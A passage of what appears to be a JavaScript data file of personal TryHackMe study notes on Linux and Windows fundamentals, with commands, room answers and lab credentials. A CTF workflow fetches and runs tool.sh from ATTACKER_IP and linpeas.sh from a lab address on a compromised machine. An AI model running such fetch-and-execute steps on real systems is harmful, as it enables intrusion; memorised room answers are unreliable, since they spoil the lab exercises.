  wget -O custom_name.txt https://example.com/f    → save with custom name
  wget -r https://example.com/                     → recursive download

PYTHON HTTP SERVER:
Quickly serve files over the network — turns any directory into a web server
  python3 -m http.server         → serve current directory on port 8000
  python3 -m http.server 9999    → custom port

CTF FILE TRANSFER WORKFLOW:
  On ATTACKER machine (where tools/files to transfer are):
    1. cd /path/to/files
    2. python3 -m http.server 8000

  On TARGET / COMPROMISED machine (receiving files):
    3. wget http://ATTACKER_IP:8000/tool.sh
    4. chmod +x tool.sh
    5. ./tool.sh

WHY THIS IS POWERFUL:
  → No FTP server to configure
  → Uses standard HTTP — often allowed through firewalls
  → Python is on nearly every Linux system`,
        commands: [
          'wget https://example.com/file.txt',
          'wget -O exploit.py https://example.com/exploit.py',
          'python3 -m http.server',
          'python3 -m http.server 9999',
          'wget http://10.10.10.5:8000/linpeas.sh',
          'chmod +x linpeas.sh',
          './linpeas.sh',
        ],
        answer: null,
      },
      {
        num: 3,
        title: "Process Management — ps, kill, systemctl",
        notes: `PROCESS — any program currently running on the system
  Each process has: PID, Owner, State, Priority

ps COMMANDS:
  ps              → processes for current user in current terminal
  ps aux          → ALL processes from ALL users with full details
  OUTPUT: USER | PID | %CPU | %MEM | COMMAND

kill COMMANDS:
  kill <PID>       → send SIGTERM (15) — polite, process can clean up
  kill -9 <PID>    → send SIGKILL (9) — forceful immediate termination
  WORKFLOW: ps aux | grep apache2  → find PID  → kill <PID>

systemctl — Manage services:
  sudo systemctl start apache2     → start a stopped service
  sudo systemctl stop apache2      → stop a running service
  sudo systemctl enable apache2    → start on REBOOT (persistence!)
  sudo systemctl disable apache2   → prevent from starting on reboot

  start/stop  = affects CURRENT session only
  enable/disable = affects what happens on NEXT REBOOT

SECURITY NOTE:
  → Attackers use systemctl enable to make malware persistent`,
        commands: [
          'ps', 'ps aux', 'ps aux | grep apache2',
          'kill 1234', 'kill -9 1234',
          'sudo systemctl start apache2', 'sudo systemctl stop apache2',
          'sudo systemctl status apache2', 'sudo systemctl enable ssh',
          'systemctl list-units --type=service', 'top', 'htop',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "Cron Jobs — Task Automation",
        notes: `CRONTAB FORMAT:
  MIN  HOUR  DOM  MON  DOW  COMMAND

  MIN  = Minute (0-59)     HOUR = Hour (0-23)
  DOM  = Day of Month (1-31)   MON = Month (1-12)
  DOW  = Day of Week (0-7, where 0 and 7 = Sunday)
  *    = "every" / "any value"

EXAMPLES:
  0 2 * * * /bin/backup.sh       → Run at 2:00 AM every day
  */30 * * * * /scripts/check.sh → Run every 30 minutes
  0 9 * * 1 /scripts/weekly.sh   → Run at 9:00 AM every Monday
  @reboot /scripts/startup.sh    → Run ONCE when system boots

MANAGING CRONTABS:
  crontab -e       → Edit YOUR crontab
  crontab -l       → List/view your current crontabs
  crontab -r       → Delete ALL your crontabs (no confirmation!)

SECURITY: Cron is a PRIMARY persistence mechanism for malware!
ALWAYS CHECK THESE DURING INCIDENT RESPONSE / PRIV ESC:
  crontab -l  |  sudo crontab -l  |  cat /etc/crontab  |  ls /etc/cron.d/`,
        commands: [
          'crontab -e', 'crontab -l', 'sudo crontab -l',
          'cat /etc/crontab', 'ls /etc/cron.d/', 'ls /etc/cron.daily/',
          '// Example entries:',
          '0 2 * * * /bin/bash /scripts/backup.sh',
          '*/5 * * * * /usr/bin/python3 /opt/monitor.py',
          '@reboot /bin/bash /opt/startup.sh',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "Package Management — apt",
        notes: `APT COMMANDS:
  sudo apt update         → Refresh package index (ALWAYS run before install)
  sudo apt upgrade        → Install updates for all installed packages
  sudo apt install nmap   → Install package + dependencies automatically
  sudo apt remove nmap    → Uninstall but KEEP config files
  sudo apt purge nmap     → Uninstall AND DELETE config files (cleaner)
  sudo apt autoremove     → Remove unused dependency packages

  apt search <keyword>    → search available packages
  apt show <package>      → detailed info before installing
  dpkg -l                 → list all installed packages

ADDING THIRD-PARTY REPOS:
  Step 1: Download and trust the GPG key (verifies authenticity)
  Step 2: Add repository to apt sources
  Step 3: sudo apt update
  Step 4: sudo apt install <package>`,
        commands: [
          'sudo apt update', 'sudo apt upgrade',
          'sudo apt update && sudo apt upgrade',
          'sudo apt install nmap', 'sudo apt remove nmap',
          'sudo apt purge nmap', 'sudo apt autoremove',
          'apt search text-editor', 'apt show nmap',
          'dpkg -l', 'dpkg -l | grep nmap',
        ],
        answer: null,
      },
      {
        num: 6,
        title: "System Logs — /var/log",
        notes: `KEY LOG FILES:
  /var/log/auth.log      → SSH logins, su/sudo usage, brute-force attempts
  /var/log/syslog        → General system messages, kernel events
  /var/log/apache2/access.log → Every HTTP request to Apache web server
  /var/log/apache2/error.log  → Config problems, PHP errors
  /var/log/fail2ban.log  → Which IPs were banned and why
  /var/log/ufw.log       → UFW firewall blocked connections

APACHE ACCESS.LOG FORMAT:
  IP - - [timestamp] "METHOD /path HTTP/version" STATUS size
  Look for: web attacks (SQLi, XSS), directory scanning, error codes

READING LOG FILES:
  cat /var/log/auth.log                   → view entire log
  tail -n 50 /var/log/syslog              → last 50 lines
  tail -f /var/log/apache2/access.log     → LIVE monitoring (updates in real time)
  grep "Failed" /var/log/auth.log         → find failed logins
  grep "10.10.10.5" /var/log/apache2/access.log → all requests from specific IP
  grep "POST" /var/log/apache2/access.log → POST requests (logins, uploads, attacks)
  grep " 404 " /var/log/apache2/access.log → not-found errors (scanning activity)`,
        commands: [
          'ls /var/log/', 'cat /var/log/auth.log',
          'tail -f /var/log/apache2/access.log',
          'tail -n 100 /var/log/syslog',
          'grep "Failed password" /var/log/auth.log',
          'grep "Accepted" /var/log/auth.log',
          'grep " 404 " /var/log/apache2/access.log',
          'grep "POST" /var/log/apache2/access.log',
        ],
        answer: null,
      },
    ],
    tools: ["nano", "vim", "wget", "Python HTTP Server", "apt", "systemctl", "cron", "ps", "kill"],
    mitre: [
      "T1053.003 — Scheduled Task/Job: Cron (Persistence)",
      "T1059.004 — Command and Scripting Interpreter: Unix Shell",
      "T1105 — Ingress Tool Transfer (wget)",
      "T1543.002 — Create or Modify System Process: Systemd Service",
    ],
    personalNotes:
      "python3 -m http.server is one of the most used CTF tricks — memorise it cold. tail -f on access.log is powerful during web challenges. Cron @reboot persistence is in many CTFs and is a real-world malware technique.",
  },

  // ═══════════════════════════════════════════════════════
  // WINDOWS & AD FUNDAMENTALS
  // ═══════════════════════════════════════════════════════

  {
    id: "windows-fundamentals-1",
    title: "Windows Fundamentals Part 1",
    platform: "TryHackMe",
    category: "Windows",
    difficulty: "Easy",
    icon: "🪟",
    completed: true,
    tags: ["Windows", "NTFS", "UAC", "GUI", "Permissions", "File System"],
    overview:
      "Part 1 of the Windows Fundamentals module. Covers the Windows desktop (GUI), the NTFS file system and its permissions, Alternate Data Streams (ADS), UAC (User Account Control), the Control Panel, and Task Manager. Target VM: Windows Server 2019 Standard.",
    keyLearnings: [
      "BitLocker encryption is exclusive to Windows Pro — not available in Home edition",
      "NTFS = New Technology File System — supports files >4GB, permissions, compression, encryption (EFS)",
      "NTFS is a journaling file system — can auto-repair using log files after failure",
      "ADS (Alternate Data Streams) — every NTFS file has $DATA stream; malware can hide data in extra streams",
      "UAC = User Account Control — prompts for elevation even for admin accounts since Vista",
      "%windir% is the environment variable pointing to the Windows installation directory",
      "System32 folder holds critical OS files — NEVER delete anything from it",
      "Ctrl+Shift+Esc = keyboard shortcut to open Task Manager",
      "NTFS permissions: Full Control, Modify, Read & Execute, List Folder Contents, Read, Write",
    ],
    tasks: [
      {
        num: 1,
        title: "Windows Editions",
        notes: `WINDOWS VERSION HISTORY:
  1985  → Windows 1.0 (first release)
  XP    → Very popular, long-running; end-of-life caused major panic
  Vista → Complete overhaul, poorly received, quickly phased out
  7     → Corporations scrambled to test against hardware/devices
  8.x   → Short-lived, like Vista
  10    → Major improvement — updates can no longer be ignored/skipped
  11    → Current desktop OS (released October 5, 2021)

WINDOWS 11 EDITIONS:
  Home → Standard features for consumers
  Pro  → Adds BitLocker encryption, Remote Desktop, Hyper-V, Group Policy

WINDOWS SERVER:
  Current version: Windows Server 2025
  VM in this room: Windows Server 2019 Standard

IMPORTANT DATES:
  Windows 10 support ends: October 14, 2025
  Windows 11 released: October 5, 2021

ANSWER: BitLocker is available on Pro, NOT on Home.`,
        commands: [],
        answer: "BitLocker",
      },
      {
        num: 2,
        title: "The Desktop (GUI)",
        notes: `WINDOWS DESKTOP COMPONENTS:
  1. The Desktop        → shortcuts to programs, folders, files
  2. Start Menu         → access to apps, settings, power options
  3. Search Box (Cortana)
  4. Task View          → view all open windows, virtual desktops
  5. Taskbar            → pinned apps + running applications
  6. Toolbars           → optional extra toolbars
  7. Notification Area  → clock, volume, network, Action Center

START MENU SECTIONS:
  Left panel → user account, Documents, Pictures, Settings, Power
  Middle     → Recently added apps + all installed apps (alphabetical)
  Right      → Tiles (pinnable app shortcuts)

TASKBAR:
  → Right-click taskbar to configure it
  → Hovering over taskbar items shows thumbnail previews
  → Items disappear from taskbar when closed (unless pinned)

NOTIFICATION AREA:
  → Located bottom-right
  → Shows: Clock, Network, Volume, Action Center
  → Customizable via Taskbar Settings`,
        commands: [],
        answer: null,
      },
      {
        num: 3,
        title: "Introduction to Windows",
        notes: `VM CREDENTIALS FOR THIS ROOM:
  Machine IP:  MACHINE_IP
  User:        administrator
  Password:    letmein123!

Access via Remote Desktop (RDP):
  → Accept Certificate when prompted
  → Machine may take up to 3 minutes to load

NOTE: The VM runs Windows Server 2019 Standard.`,
        commands: [
          '// Connect via RDP or browser-based VM',
          '// Credentials: administrator / letmein123!',
        ],
        answer: null,
      },
      {
        num: 4,
        title: "The File System — NTFS",
        notes: `FILE SYSTEM EVOLUTION:
  FAT16/FAT32 → Old; still used on USB drives, MicroSD cards
  HPFS        → High Performance File System
  NTFS        → Current Windows file system

NTFS ADVANTAGES OVER FAT:
  • Supports files larger than 4GB
  • Set specific permissions on folders and files
  • Folder and file compression
  • Encryption (EFS — Encryption File System)
  • Journaling — can auto-repair after failures
  • Alternate Data Streams (ADS)

NTFS PERMISSIONS:
  Full Control       → read, write, modify, delete, change permissions
  Modify             → read, write, modify, delete
  Read & Execute     → view and run files
  List Folder Contents → view folder contents
  Read               → view files/folders
  Write              → create new files/folders

HOW TO VIEW PERMISSIONS:
  Right-click → Properties → Security tab → select user/group

ALTERNATE DATA STREAMS (ADS):
  → Every NTFS file has at least one stream called $DATA
  → ADS allows files to contain MORE than one stream of data
  → Windows Explorer does NOT display ADS by default
  → Malware writers use ADS to HIDE data
  → Files downloaded from the internet have ADS identifiers written to them
  → Use PowerShell: Get-Item -Path "file.txt" -Stream * to view ADS`,
        commands: [
          '// Check file system: right-click C: drive → Properties',
          '// View ADS with PowerShell:',
          'Get-Item -Path "C:\\file.txt" -Stream *',
          '// View permissions: right-click file → Properties → Security',
        ],
        answer: "New Technology File System",
      },
      {
        num: 5,
        title: "The Windows\\System32 Folders",
        notes: `WINDOWS FOLDER:
  Default location: C:\\Windows
  Can technically reside on any drive, any folder

ENVIRONMENT VARIABLE FOR WINDOWS DIRECTORY:
  %windir% → points to the Windows installation directory
  Example: C:\\Windows

WHAT ARE ENVIRONMENT VARIABLES?
  → Store information about the OS environment
  → Include: OS path, number of processors, location of temp folders
  → Used by OS and programs to locate resources

SYSTEM32 FOLDER:
  Location: C:\\Windows\\System32
  Purpose: Holds CRITICAL files for the operating system

⚠ WARNING:
  NEVER delete or modify files in System32 — doing so can render
  the Windows OS completely inoperational (non-bootable).

Most tools covered in Windows Fundamentals reside within System32.`,
        commands: [
          '// Access System32:',
          'cd C:\\Windows\\System32',
          '// Or use environment variable:',
          'cd %windir%\\System32',
        ],
        answer: "%windir%",
      },
      {
        num: 6,
        title: "User Accounts, Profiles, and Permissions",
        notes: `TWO TYPES OF USER ACCOUNTS:
  1. Administrator → can make changes to the system (add users, modify settings, install programs)
  2. Standard User → can only change their own files/folders, cannot install programs

USER PROFILE LOCATION:
  C:\\Users\\<username>  (e.g. C:\\Users\\Max)
  Each profile contains: Desktop, Documents, Downloads, Music, Pictures

PROFILE CREATION:
  → Created on FIRST login by the User Profile Service
  → You'll see "Setting up your profile" message on first login

HOW TO MANAGE USERS:
  Method 1: Start Menu → type "Other User" → System Settings → Other users
  Method 2: Start Menu → Run → lusrmgr.msc (Local Users and Group Management)

GROUPS IN WINDOWS:
  → Permissions are assigned to GROUPS
  → Users added to groups INHERIT group permissions
  → A user can be a member of MULTIPLE groups
  → Administrators group → full system control
  → Standard Users group → limited access

BUILT-IN ACCOUNTS:
  Administrator → admin account (UAC does NOT apply to this by default)
  Guest         → built-in account for guest access to the computer`,
        commands: [
          '// Open Local Users and Groups Management:',
          'lusrmgr.msc',
          '// Or via Run dialog (Win + R):',
          'lusrmgr.msc',
        ],
        answer: null,
      },
      {
        num: 7,
        title: "User Account Control (UAC)",
        notes: `DEFINITION — UAC (User Account Control):
Introduced in Windows Vista to protect users running with admin privileges.

HOW UAC WORKS:
  → Even admin accounts run with STANDARD user privileges by default
  → When an operation requires elevated privileges, UAC PROMPTS the user
  → User must confirm (or provide admin password) to proceed

WHY UAC MATTERS:
  → Most home users run as local administrators
  → Without UAC, malware runs with FULL admin rights automatically
  → UAC limits blast radius — malware must get user consent to escalate

THE SHIELD ICON:
  → A shield on a program's icon = UAC prompt will appear when run
  → Indicates the program requires elevated privileges to execute

NOTE: UAC does NOT apply to the built-in local Administrator account by default.

UAC PROMPT TYPES:
  → If you're an admin: just click Yes/No
  → If you're a standard user: must enter admin username + password`,
        commands: [
          '// Check UAC settings:',
          'UserAccountControlSettings.exe',
        ],
        answer: "User Account Control",
      },
      {
        num: 8,
        title: "Settings and the Control Panel",
        notes: `TWO PLACES TO MAKE SYSTEM CHANGES:

SETTINGS (Modern — Windows 8+):
  → Primary location for system changes in Windows 10/11
  → Touch-screen friendly, clean UI
  → Access: Start Menu → Settings (gear icon)

CONTROL PANEL (Legacy):
  → Traditional system management interface
  → More complex settings and actions
  → Access: Start Menu → type "Control Panel"
  → View: Small Icons → reveals all categories

KEY DIFFERENCE:
  Settings = simplified modern interface for common tasks
  Control Panel = advanced configuration, legacy tools

SOMETIMES THEY CONNECT:
  → Settings → Network & Internet → Change adapter options
  → This opens a Control Panel window!

HOW TO FIND SETTINGS:
  → Use Start Menu search — type what you're looking for
  → Windows will show both Settings and Control Panel results

ANSWER: Last setting in Control Panel (Small Icons view) = Windows Defender Firewall`,
        commands: [
          '// Open Control Panel:',
          'control.exe',
          '// Open specific sections:',
          'control.exe /name Microsoft.Troubleshooting',
          'control.exe /name Microsoft.WindowsUpdate',
        ],
        answer: "Windows Defender Firewall",
      },
      {
        num: 9,
        title: "Task Manager",
        notes: `TASK MANAGER — PURPOSE:
  → Provides information about applications and processes currently running
  → Shows CPU and RAM utilization (Performance tab)
  → Manage startup items, services, users, details

HOW TO OPEN:
  → Right-click the taskbar → Task Manager
  → Keyboard shortcut: Ctrl + Shift + Esc  ← MEMORIZE THIS
  → Ctrl + Alt + Del → Task Manager
  → Start Menu → type "Task Manager"

SIMPLE VIEW vs DETAILED VIEW:
  → Opens in Simple View by default (just app list)
  → Click "More details" to expand all tabs

TABS AVAILABLE (in expanded view):
  Processes   → all running applications and background processes
  Performance → real-time CPU, RAM, disk, network graphs
  App history → resource usage over time
  Startup     → programs that launch at Windows startup
  Users       → active user sessions
  Details     → detailed process information (PID, CPU, memory)
  Services    → Windows services and their status

KEYBOARD SHORTCUT: Ctrl + Shift + Esc`,
        commands: [
          '// Open Task Manager:',
          '// Ctrl + Shift + Esc  ← fastest method',
          '// OR: right-click taskbar → Task Manager',
          '// OR: Ctrl + Alt + Del → Task Manager',
          'taskmgr',
        ],
        answer: "Ctrl+Shift+Esc",
      },
    ],
    tools: ["Task Manager", "Control Panel", "lusrmgr.msc"],
    mitre: [
      "T1548.002 — Bypass User Account Control",
      "T1083 — File and Directory Discovery",
    ],
    personalNotes:
      "ADS is commonly tested in CTFs — remember Get-Item -Stream * in PowerShell. UAC bypass is a classic Windows priv-esc technique. %windir% and %SystemRoot% both point to C:\\Windows. Ctrl+Shift+Esc for Task Manager is muscle memory.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "windows-fundamentals-2",
    title: "Windows Fundamentals Part 2",
    platform: "TryHackMe",
    category: "Windows",
    difficulty: "Easy",
    icon: "🪟",
    completed: true,
    tags: ["Windows", "MSConfig", "Registry", "resmon", "Computer Management", "Event Viewer", "CMD"],
    overview:
      "Part 2 of Windows Fundamentals. Covers System Configuration (MSConfig), UAC Settings, Computer Management, System Information (msinfo32), Resource Monitor (resmon), Command Prompt essentials, and the Windows Registry Editor.",
    keyLearnings: [
      "MSConfig (System Configuration) = for advanced troubleshooting and diagnosing startup issues",
      "MSConfig tabs: General, Boot, Services, Startup, Tools",
      "Computer Management (compmgmt.msc) has three sections: System Tools, Storage, Services and Applications",
      "Event Viewer provides audit trail of all system events — 5 event types",
      "msinfo32 = Microsoft System Information — hardware, components, software environment",
      "resmon = Resource Monitor — per-process CPU, memory, disk, network usage",
      "Windows Registry = central hierarchical database for system configuration",
      "regedit or regedt32 opens the Registry Editor",
      "UAC has 4 levels: Always notify, Notify for apps (default), Notify without dimming, Never notify",
      "net help <subcommand> is the correct way to get help for net commands (not /?)",
    ],
    tasks: [
      {
        num: 1,
        title: "System Configuration (MSConfig)",
        notes: `SYSTEM CONFIGURATION (MSConfig):
Purpose: Advanced troubleshooting, primarily for diagnosing startup issues.
Open: Start Menu → search "MSConfig" (requires local admin rights)

FIVE TABS:
  1. General  → Normal, Diagnostic, or Selective startup options
  2. Boot     → Define various boot options for the OS
  3. Services → List ALL configured services (running or stopped)
  4. Startup  → Manage startup items (redirects to Task Manager in Win10)
  5. Tools    → Launch various system utilities from a central place

TOOLS TAB — IMPORTANT COMMANDS:
  Computer Management: compmgmt.msc
  System Information:  msinfo32.exe
  Resource Monitor:    resmon.exe
  Registry Editor:     regedt32.exe
  UAC Settings:        UserAccountControlSettings.exe
  Internet Protocol Config: C:\\Windows\\System32\\cmd.exe /k %windir%\\system32\\ipconfig.exe
  Troubleshooting:     C:\\Windows\\System32\\control.exe /name Microsoft.Troubleshooting
  Control Panel:       control.exe

ADVANCED SYSTEM SETTINGS:
  → Search "View advanced system settings" in Start Menu
  → System Properties panel → Advanced tab
  → Performance Settings → shows page file (virtual memory) size
  → Startup and Recovery → configure crash dump settings

CRASH DUMP TYPES:
  Automatic memory dump | Kernel memory dump | Small memory dump (256KB)
  Complete memory dump | None`,
        commands: [
          'msconfig',
          '// From Run dialog (Win + R):',
          'msconfig',
          'compmgmt.msc',
          'msinfo32.exe',
          'resmon.exe',
          'regedt32.exe',
          'UserAccountControlSettings.exe',
          'control.exe',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Change UAC Settings",
        notes: `UAC SLIDER — 4 LEVELS (top to bottom):

Level 4 — ALWAYS NOTIFY (Highest Security):
  → Notifies whenever ANY app OR YOU make changes
  → Desktop DIMS (Secure Desktop)
  → Best for high-security environments

Level 3 — NOTIFY FOR APPS (Default):
  → Notifies only when APPS try to make changes
  → NOT when YOU change Windows settings
  → Desktop dims

Level 2 — NOTIFY WITHOUT DIMMING:
  → Same as Level 3 but screen does NOT dim
  → Slightly less secure (vulnerable to UI spoofing)

Level 1 — NEVER NOTIFY (Lowest Security):
  → All notifications turned off
  → Windows won't warn you about ANY changes
  → NOT RECOMMENDED

CURRENT LEVEL: Look at slider position in UAC Settings window

COMMAND: UserAccountControlSettings.exe`,
        commands: [
          '// Open UAC Settings:',
          'UserAccountControlSettings.exe',
          '// Or via Run dialog (Win + R):',
          'UserAccountControlSettings.exe',
        ],
        answer: "UserAccountControlSettings.exe",
      },
      {
        num: 3,
        title: "Computer Management (compmgmt.msc)",
        notes: `COMPUTER MANAGEMENT — THREE SECTIONS:

1. SYSTEM TOOLS:
   Task Scheduler:
   → Create/manage tasks that run automatically at specified times
   → Tasks can run apps, scripts, at log in/off, or on a schedule
   → View scheduled tasks: Task Scheduler Library

   Event Viewer:
   → Audit trail of events that occurred on the computer
   → Three panes: left (providers tree), middle (event summary), right (actions)
   → 5 EVENT TYPES: Information, Warning, Error, Success Audit, Failure Audit
   → Standard logs under Windows Logs: Application, Security, Setup, System, Forwarded Events

   Shared Folders:
   → Shares: lists all shared resources (C$, ADMIN$ are default admin shares)
   → Sessions: who is currently connected
   → Open Files: files currently accessed by connected users

   Local Users and Groups:
   → Same as lusrmgr.msc

   Performance:
   → Performance Monitor (perfmon) — real-time or log-based performance data

   Device Manager:
   → View and configure hardware; disable/enable devices

2. STORAGE:
   Disk Management:
   → Set up new drives, extend/shrink partitions
   → Assign or change drive letters

3. SERVICES AND APPLICATIONS:
   Services:
   → List all services with display names, status, startup type
   → Startup Types: Automatic, Manual, Disabled
   → Right-click → Properties for details (executable path, startup type)

   WMI Control:
   → Configures Windows Management Instrumentation (WMI) service
   → Allows scripting via VBScript or PowerShell to manage Windows
   → WMIC is deprecated in Windows 10 v21H1; PowerShell supersedes it`,
        commands: [
          'compmgmt.msc',
          '// Or via Run dialog:',
          'compmgmt.msc',
          '// Open Event Viewer directly:',
          'eventvwr.msc',
          '// Open Disk Management directly:',
          'diskmgmt.msc',
          '// Open Services directly:',
          'services.msc',
          '// Open Performance Monitor:',
          'perfmon.exe',
        ],
        answer: "compmgmt.msc",
      },
      {
        num: 4,
        title: "System Information (msinfo32)",
        notes: `MSINFO32 — Microsoft System Information Tool:
Purpose: Gathers and displays comprehensive info about hardware, system components, and software environment.

THREE SECTIONS:
  1. HARDWARE RESOURCES → advanced hardware info (not for average users)
  2. COMPONENTS          → specific hardware devices (Display, Input, Network, etc.)
  3. SOFTWARE ENVIRONMENT → Environment Variables, Network Connections, Running Tasks, etc.

SYSTEM SUMMARY INFO:
  → OS Name and Version
  → System Name (hostname)
  → Processor (brand and model)
  → BIOS/UEFI information
  → Installed RAM
  → Page File location

ENVIRONMENT VARIABLES (via Software Environment):
  → Store info about the OS environment
  → WINDIR = location of Windows installation
  → ComSpec = path to cmd.exe (default: %SystemRoot%\\system32\\cmd.exe)
  → PATH = directories searched for executables

SEARCH FEATURE:
  → At the bottom of msinfo32 there is a search bar
  → Can search across all categories (e.g. search "IP address")

COMMAND: msinfo32.exe`,
        commands: [
          'msinfo32.exe',
          '// Or via Run dialog:',
          'msinfo32',
        ],
        answer: "msinfo32.exe",
      },
      {
        num: 5,
        title: "Resource Monitor (resmon)",
        notes: `RESOURCE MONITOR — PURPOSE:
Displays per-process and aggregate CPU, memory, disk, and network usage in real-time.

FOUR MAIN SECTIONS (in Overview tab):
  1. CPU     → processes using CPU, context switches
  2. Disk    → per-process disk I/O activity
  3. Network → active network connections, bytes sent/received
  4. Memory  → physical memory usage, page faults, working sets

TABS:
  Overview → all 4 sections in summary view
  CPU      → detailed per-process CPU usage
  Memory   → physical memory breakdown (In Use, Modified, Standby, Free)
  Disk     → per-process disk activity
  Network  → per-process network connections

ADDITIONAL FEATURES:
  → Process analysis feature — helps identify deadlocked processes
  → Start, stop, pause, and resume services from within resmon
  → Close unresponsive applications
  → Graphical view in real-time on the right pane

COMMAND: resmon.exe
(Also available through MSConfig → Tools → Resource Monitor)`,
        commands: [
          'resmon.exe',
          '// Or via Run dialog:',
          'resmon',
        ],
        answer: "resmon.exe",
      },
      {
        num: 6,
        title: "Command Prompt Essentials",
        notes: `BASIC COMMANDS:
  hostname    → outputs the computer name
  whoami      → outputs the name of the logged-in user
  ver         → shows OS version
  systeminfo  → lists detailed system information (OS, hardware, RAM)
  cls         → clears the command prompt screen
  help        → provides help info for a specific command

NETWORK COMMANDS:
  ipconfig                → shows network address settings
  ipconfig /?             → shows help/manual for ipconfig
  ipconfig /all           → detailed info (DNS, DHCP, MAC address)
  ping <target>           → test connectivity via ICMP
  tracert <target>        → trace network route to destination
  netstat                 → display protocol stats and TCP/IP connections
  netstat -a              → all established connections and listening ports
  netstat -b              → shows EXECUTABLE per connection
  netstat -o              → shows PID associated with each connection
  netstat -n              → numeric format (no hostname resolution)
  netstat -abon           → combine all above options

NET COMMAND:
  net                     → display help/syntax
  net help                → shows help (NOT net /? — that doesn't work!)
  net help user           → help for net user subcommand
  net user                → manage user accounts
  net localgroup          → manage local groups
  net share               → manage shared resources
  net session             → manage server connections
  net use                 → manage network drive connections

PIPE TO more:
  driverquery | more      → displays output page by page
  Space bar → next page  | Ctrl+C → exit`,
        commands: [
          'hostname',
          'whoami',
          'ver',
          'systeminfo',
          'ipconfig',
          'ipconfig /all',
          'ipconfig /?',
          'netstat',
          'netstat -abon',
          'net help user',
          'cls',
          'driverquery | more',
        ],
        answer: null,
      },
      {
        num: 7,
        title: "Registry Editor",
        notes: `WINDOWS REGISTRY — DEFINITION:
A central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices.

WHAT THE REGISTRY CONTAINS:
  • Profiles for each user
  • Applications installed and the documents they can create
  • Property sheet settings for folders and application icons
  • What hardware exists on the system
  • The ports that are being used

REGISTRY STRUCTURE (Hive keys):
  HKEY_CLASSES_ROOT     (HKCR) → file associations, COM objects
  HKEY_CURRENT_USER     (HKCU) → settings for currently logged-in user
  HKEY_LOCAL_MACHINE    (HKLM) → system-wide settings for all users
  HKEY_USERS            (HKU)  → all loaded user profiles
  HKEY_CURRENT_CONFIG   (HKCC) → current hardware profile info

⚠ WARNING:
  Making changes to the registry can affect normal computer operations.
  Always back up before editing. Registry is for ADVANCED users only.

COMMANDS TO OPEN REGISTRY EDITOR:
  regedit        → Registry Editor (GUI)
  regedt32.exe   → also opens Registry Editor (same tool on modern Windows)`,
        commands: [
          'regedit',
          'regedt32.exe',
          '// Or via Run dialog (Win + R):',
          'regedit',
        ],
        answer: "regedt32.exe",
      },
    ],
    tools: ["MSConfig", "compmgmt.msc", "msinfo32.exe", "resmon.exe", "regedit", "Event Viewer"],
    mitre: [
      "T1547.001 — Boot or Logon Autostart: Registry Run Keys",
      "T1112 — Modify Registry",
      "T1057 — Process Discovery (Task Manager / tasklist)",
    ],
    personalNotes:
      "Key commands to memorize cold: compmgmt.msc, msinfo32.exe, resmon.exe, regedt32.exe, UserAccountControlSettings.exe. Registry Run keys (HKLM/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run) are the #1 persistence mechanism in malware.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "windows-fundamentals-3",
    title: "Windows Fundamentals Part 3",
    platform: "TryHackMe",
    category: "Windows",
    difficulty: "Easy",
    icon: "🪟",
    completed: true,
    tags: ["Windows Security", "BitLocker", "TPM", "Windows Defender", "Firewall", "VSS", "Windows Update"],
    overview:
      "Part 3 of Windows Fundamentals. Covers built-in Windows security tools: Windows Updates (Patch Tuesday), Windows Security dashboard, Virus & Threat Protection, Firewall & Network Protection, App & Browser Control (SmartScreen), Device Security (TPM/Core Isolation), BitLocker, and Volume Shadow Copy Service (VSS).",
    keyLearnings: [
      "Windows Updates released on 2nd Tuesday of each month — called Patch Tuesday",
      "Windows Security areas: Virus & threat protection, Firewall & network protection, App & browser control, Device security",
      "Green = protected | Yellow = review recommended | Red = immediate attention needed",
      "Real-time protection: locates and stops malware from installing or running",
      "3 firewall profiles: Domain, Private, Public",
      "SmartScreen protects against phishing/malware websites and downloading potentially malicious files",
      "TPM = Trusted Platform Module — hardware-based security chip for cryptographic operations",
      "BitLocker requires TPM v1.2+ for best protection; uses startup key on systems without TPM",
      "VSS = Volume Shadow Copy Service — creates point-in-time snapshots; targeted by ransomware",
      "Ransomware deletes VSS shadow copies — offline/offsite backups are the only defence",
    ],
    tasks: [
      {
        num: 1,
        title: "Windows Updates",
        notes: `WINDOWS UPDATE — PURPOSE:
Provides security updates, feature enhancements, and patches for Windows and Microsoft products (including Defender).

PATCH TUESDAY:
  → Updates released on the 2ND TUESDAY of each month
  → Critical/urgent updates can be released any time (out-of-band)
  → Reference: Microsoft Security Update Guide

KEY CHANGE IN WINDOWS 10:
  → Updates can NO LONGER be completely ignored or pushed aside forever
  → Updates can be POSTPONED but eventually will happen
  → Reboot is typically required after Windows updates

ACCESS WINDOWS UPDATE:
  → Settings → Windows Update
  → OR via Run/CMD: control /name Microsoft.WindowsUpdate

IN ATTACHED VM:
  → Updates are 'managed' (typical in corporate environments)
  → No available updates (VM has no internet access)

CHECKING UPDATE HISTORY:
  → Windows Update → View update history
  → Shows definition updates, quality updates, feature updates`,
        commands: [
          '// Open Windows Update via Run:',
          'control /name Microsoft.WindowsUpdate',
          '// Check update history in Settings → Windows Update → View update history',
        ],
        answer: "5/3/2021",
      },
      {
        num: 2,
        title: "Windows Security Dashboard",
        notes: `WINDOWS SECURITY — HOME FOR PROTECTION TOOLS

ACCESS:
  → Settings → Windows Security → Open Windows Security
  → OR search "Windows Security" in Start Menu

PROTECTION STATUS ICONS:
  🟢 Green  → device sufficiently protected, no action needed
  🟡 Yellow → safety recommendation to review
  🔴 Red    → warning, something needs IMMEDIATE attention

PROTECTION AREAS:
  1. Virus & Threat Protection   → antivirus scanning, real-time protection
  2. Firewall & Network Protection → control incoming/outgoing traffic
  3. App & Browser Control        → SmartScreen, exploit protection
  4. Device Security              → Core isolation, TPM, hardware security

NOTE: Windows Server 2019 UI looks different from Windows 10/11 Home/Pro.`,
        commands: [
          '// Open Windows Security:',
          'windowsdefender:',
          '// Or search in Start Menu: "Windows Security"',
        ],
        answer: "Virus & threat protection",
      },
      {
        num: 3,
        title: "Virus & Threat Protection",
        notes: `TWO PARTS: Current Threats + Virus & Threat Protection Settings

CURRENT THREATS — SCAN OPTIONS:
  Quick Scan  → checks commonly infected folders
  Full Scan   → checks all files and running programs (can take >1 hour)
  Custom Scan → choose specific files and locations

THREAT HISTORY:
